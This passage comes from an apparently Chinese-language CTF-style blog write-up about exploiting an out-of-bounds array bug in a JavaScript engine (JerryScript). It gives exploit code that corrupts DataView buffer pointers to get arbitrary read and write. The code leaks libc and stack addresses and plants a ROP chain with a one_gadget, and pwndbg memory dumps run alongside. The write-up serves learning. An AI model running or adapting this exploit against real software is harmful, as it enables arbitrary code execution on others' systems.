class="literal">true</span>);</span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">0x31</span>];</span><br><span class="line">a1 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d1 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a1);</span><br><span class="line">d1.setUint32(<span class="number">0</span>, <span class="number">0x41414141</span>, <span class="literal">true</span>);</span><br><span class="line">a2 = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">d2 = <span class="keyword">new</span> <span class="built_in">DataView</span>(a2);</span><br><span class="line">d2.setUint32(<span class="number">0</span>, <span class="number">0x42424242</span>, <span class="literal">true</span>);</span><br><span class="line">a.pop();</span><br><span class="line">a[<span class="number">0x2c</span>] = <span class="number">0x5562526</span>;</span><br><span class="line">puts_got            = <span class="built_in">Number</span>(aar(<span class="number">0x555555621e08</span>, d1, d2));</span><br><span class="line">libc_base           = puts_got - <span class="number">0x84420</span>;</span><br><span class="line">environ             = libc_base + <span class="number">0x1ef600</span>;</span><br><span class="line">stack               = <span class="built_in">Number</span>(aar(environ, d1, d2));</span><br><span class="line">libc_start_main_ret = stack - <span class="number">0x108</span>;</span><br><span class="line">libc_start_main     = <span class="built_in">Number</span>(aar(libc_start_main_ret, d1, d2));</span><br><span class="line">aaw(libc_start_main_ret, <span class="number">0x555555554000</span> + <span class="number">0xa9a9</span>, d1, d2);  <span class="comment">// pop r12, rbp</span></span><br><span class="line">aaw(libc_start_main_ret + <span class="number">8</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">16</span>, <span class="number">0</span>, d1, d2);</span><br><span class="line">aaw(libc_start_main_ret + <span class="number">24</span>, libc_base + <span class="number">0xe3afe</span>, d1, d2);  <span class="comment">// one_gadget</span></span><br><span class="line">print(hex(puts_got));</span><br><span class="line">print(hex(libc_base));</span><br><span class="line">print(hex(stack));</span><br><span class="line">print(hex(libc_start_main));</span><br><span class="line">print(hex(<span class="built_in">Number</span>(aar(<span class="number">0x555555624000</span>, d1, d2))));</span><br></pre></td></tr></table></figure>
+<ul>
+<li>因为这些函数和变量都会改变堆布局，所以我直接调试 exp</li>
+</ul>
+<p>在 <code>ecma_builtin_array_prototype_object_pop</code>（710ab）打断点，然后使用 <code>p/x $rdi+0x10</code> 命令就可以把发生 OOB 的数组 <code>a</code> 给打印出来：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x $rdi+<span class="number">0x10</span></span><br><span class="line">$<span class="number">1</span> = <span class="number">0x555555624f80</span></span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x555555624f80</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x555555624f70</span>:	<span class="number">0x005e0064005e0014</span>	<span class="number">0x000000ecffffffff</span> <span class="comment">/* length */</span></span><br><span class="line"><span class="number">0x555555624f80</span>:	<span class="number">0x0025000000c80038</span>	<span class="number">0x0000000100200004</span></span><br><span class="line"><span class="number">0x555555624f90</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x42d5555558878200</span></span><br><span class="line"><span class="number">0x555555624fa0</span>:	<span class="number">0x0025006e00620018</span>	<span class="number">0x0000000100000012</span></span><br><span class="line"><span class="number">0x555555624fb0</span>:	<span class="number">0x000003c300587d37</span>	<span class="number">0x012f007200000343</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>property_list_cp</code> 和 <code>prototype_cp</code> 的值分为 <code>0x64</code> 和 <code>0x5e</code> </li>
+</ul>
+<p>然后在 <code>jerryx_print_value</code>（a5ae2）打断点，执行到 <code>print(a.length)</code> 前停下，打印两个 DataView 对象的位置：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s AAAA</span><br><span class="line">[heap]          <span class="number">0x5555556257b0</span> <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556257b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625030</span> <span class="number">0x5555556257b0</span></span><br><span class="line">    </span><br><span class="line">pwndbg&gt; search -s BBBB</span><br><span class="line">[heap]          <span class="number">0x5555556267b0</span> <span class="number">0x42424242</span> <span class="comment">/* &#x27;BBBB&#x27; */</span></span><br><span class="line">pwndbg&gt; search -t qword <span class="number">0x5555556267b0</span></span><br><span class="line">[heap]          <span class="number">0x555555625260</span> <span class="number">0x5555556267b0</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>a1-&gt;buffer_p(0x5555556257b0)：AAAA</code></li>
+<li><code>d1-&gt;buffer_p(0x555555625030)：0x5555556257b0</code></li>
+<li><code>a2-&gt;buffer_p(0x5555556267b0)：BBBB</code></li>
+<li><code>d2-&gt;buffer_p(0x555555625260)：0x5555556267b0</code></li>
+</ul>
+<p>如果我们想利用 <code>a</code> 的溢出点，必须先知道 <code>jerry_global_heap</code> 才能计算 <code>property_list_cp</code> ，而源程序没有符号表，我们只能通过对比源程序和我们自己编译的程序来获取这个值：（不知道的偏移都可以利用这个方法来解决）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55555566a000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566b7b0</span> (jerry_global_heap+<span class="number">2896</span>) ◂— <span class="number">0x42424152</span> <span class="comment">/* &#x27;RABB&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566b7b8</span> (jerry_global_heap+<span class="number">2904</span>) ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x55555566b7b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555566ac60</span> (jerry_global_heap) ◂— <span class="number">0x8e8</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555566ac68</span> (jerry_global_heap+<span class="number">8</span>) ◂— <span class="number">0x20010800be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555566ac70</span> (jerry_global_heap+<span class="number">16</span>) ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624000</span>+<span class="number">0x17b0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5555556257b8</span> ◂— <span class="number">0x0</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555556257b0</span><span class="number">-2896</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624c60</span> ◂— <span class="number">0x658</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624c68</span> ◂— <span class="number">0x2000d500be0031</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624c70</span> ◂— <span class="number">0x100000066</span> <span class="comment">/* &#x27;f&#x27; */</span></span><br></pre></td></tr></table></figure>
+<p>根据公式 <code>jerry_globals_heap + array-&gt;u1.property_list_cp &lt;&lt; 3</code> 进行计算：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">25</span>]: hex(<span class="number">0x555555624c60</span>+(<span class="number">0x64</span>&lt;&lt;<span class="number">3</span>))</span><br><span class="line">Out[<span class="number">25</span>]: <span class="string">&#x27;0x555555624f80&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>修改前：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x8800000310</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x8800000088</span></span><br><span class="line">... ↓     <span class="number">2</span> skipped</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x5555556257b0</span> ◂— <span class="number">0x41414141</span> <span class="comment">/* &#x27;AAAA&#x27; */</span></span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>修改后：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555624f80</span> ◂— <span class="number">0x25000000c80018</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x555555624f88</span> ◂— <span class="number">0x100200004</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x555555624f90</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x555555624f98</span> —▸ <span class="number">0x5555556253b8</span> —▸ <span class="number">0x555555625168</span> —▸ <span class="number">0x5555556253b0</span> —▸ <span class="number">0x5555556253c0</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x555555624fa0</span> ◂— <span class="number">0x25006e00620018</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x555555624fa8</span> ◂— <span class="number">0x100000012</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x555555624fb0</span> ◂— <span class="number">0x3c300587d37</span> <span class="comment">/* &#x27;7&#125;X&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x555555624fb8</span> ◂— <span class="number">0x12f007200000343</span></span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x555555624fc0</span> ◂— <span class="number">0x20000000680011</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x555555624fc8</span> ◂— <span class="number">0x100000040</span> <span class="comment">/* &#x27;@&#x27; */</span></span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x555555624fd0</span> ◂— <span class="number">0x10000078c8</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x555555624fd8</span> ◂— <span class="number">0x10a01a900000363</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x555555624fe0</span> ◂— <span class="number">0xe40c292c0000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x555555624fe8</span> ◂— <span class="number">0x605040477616100</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x555555624ff0</span> ◂— <span class="number">0x1c24b8a70000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x555555624ff8</span> ◂— <span class="number">0x100f0e0e0d316101</span></span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x555555625000</span> ◂— <span class="number">0x881d13e60000002b</span> <span class="comment">/* &#x27;+&#x27; */</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x555555625008</span> ◂— <span class="number">0x1c1b1a1a19316401</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x555555625010</span> ◂— <span class="number">0xb400b20074008b</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x555555625018</span> ◂— <span class="number">0xd300d000cd0076</span> <span class="comment">/* &#x27;v&#x27; */</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x555555625020</span> ◂— <span class="number">0x6c0000006c0012</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x555555625028</span> ◂— <span class="number">0x100000000319</span></span><br><span class="line"><span class="number">16</span>:<span class="number">00b</span>0│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br><span class="line"><span class="number">17</span>:<span class="number">00b</span>8│  <span class="number">0x555555625038</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
+<p>这个 <code>a[0x2c]</code> 对应的地址就是 <code>0x555555625030</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x555555624f80</span>+<span class="number">0x4</span>*<span class="number">0x2c</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x555555625030</span> —▸ <span class="number">0x555555625260</span> —▸ <span class="number">0x7fffffffde60</span> —▸ <span class="number">0x7ffff7ea2afe</span> (execvpe+<span class="number">638</span>) ◂— mov    rdx, r12</span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>0x5555556257b0</code>（<code>a1-&gt;buffer_p</code>）被修改为了 <code>0x555555625260</code>（<code>d2-&gt;buffer_p</code>）</li>
+<li>这下 <code>a1-&gt;buffer_p</code> 和 <code>a2-&gt;buffer_p</code> 都指向 <code>d2-&gt;buffer_p</code>，就可以实现 WAA 和 RAA 了</li>
+</ul>
+<p>最后的问题就是 WAA 和 RAA 的实现：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aar</span>(<span class="params">addr, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    <span class="keyword">if</span>(dv2.buffer)&#123;</span><br><span class="line">        <span class="keyword">return</span> dv2.getBigUint64(<span class="number">0</span>, <span class="literal">true</span>); <span class="comment">/* 返回该地址中的数据 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aaw</span>(<span class="params">addr, value, dv1, dv2</span>)</span>&#123;</span><br><span class="line">    dv1.setBigUint64(<span class="number">0</span>, addr, <span class="literal">true</span>); <span class="comment">/* 先写入一个地址 */</span></span><br><span class="line">    dv2.setBigUint64(<span class="number">0</span>, value, <span class="literal">true</span>); <span class="comment">/* 再向这个地址中写入数据 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后就是用 WWR 从 <code>environ</code> 中读出栈地址，然后在 <code>libc_start_main</code> 的返回值上构造 ROP 链，最后执行 one_gadget</p>
+<p>PS：在交互时需要把 <code>\n</code> 去掉，还有注释也要去掉 </p>
+<p><strong>小结：</strong></p>
+<p>调了好多天终于弄好了，现在对这种 JavaScript 引擎的题目应该是有所了解了，主要就是靠 ArrayBuffer 和 DataView 这两个函数</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/javascript-pwn/" rel="tag"><i class="fa fa-tag"></i> javascript pwn</a>
+              <a href="/tags/OOB/" rel="tag"><i class="fa fa-tag"></i> OOB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/08/19/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9A%E7%BD%91%E7%BB%9C%E6%8A%93%E5%8C%85%E5%8E%9F%E7%90%86/" rel="prev" title="网络相关知识：网络抓包原理">
+      <i class="fa fa-chevron-left"></i> 网络相关知识：网络抓包原理
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="yhellow"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">yhellow</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">138</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">99</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yhellow</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">1.8m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">27:14</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
